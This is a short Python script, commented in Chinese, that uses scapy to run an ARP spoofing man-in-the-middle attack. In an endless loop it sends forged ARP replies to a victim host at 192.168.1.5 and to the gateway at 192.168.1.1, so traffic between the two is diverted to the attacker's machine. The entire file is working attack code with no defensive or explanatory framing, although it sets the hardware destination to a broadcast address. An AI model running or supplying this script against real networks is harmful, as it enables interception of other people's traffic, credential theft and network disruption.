import scapy.all as scapy

# 发送ARP包
def spoof(target_ip, spoof_ip):
    # 生成ARP响应包，目标IP替换成受害者，源IP替换成攻击者的IP
    arp_response = scapy.ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst="ff:ff:ff:ff:ff:ff")
    scapy.send(arp_response, verbose=False)
    print(f"Sending spoofed ARP to {target_ip} [spoofed IP: {spoof_ip}]")

# 受害者和網關的 IP 地址
target_ip = "192.168.1.5"  # 假設目標IP
gateway_ip = "192.168.1.1"  # 假設網關IP

# 持續發送 ARP 欺騙封包
while True:
    spoof(target_ip, gateway_ip)
    spoof(gateway_ip, target_ip)
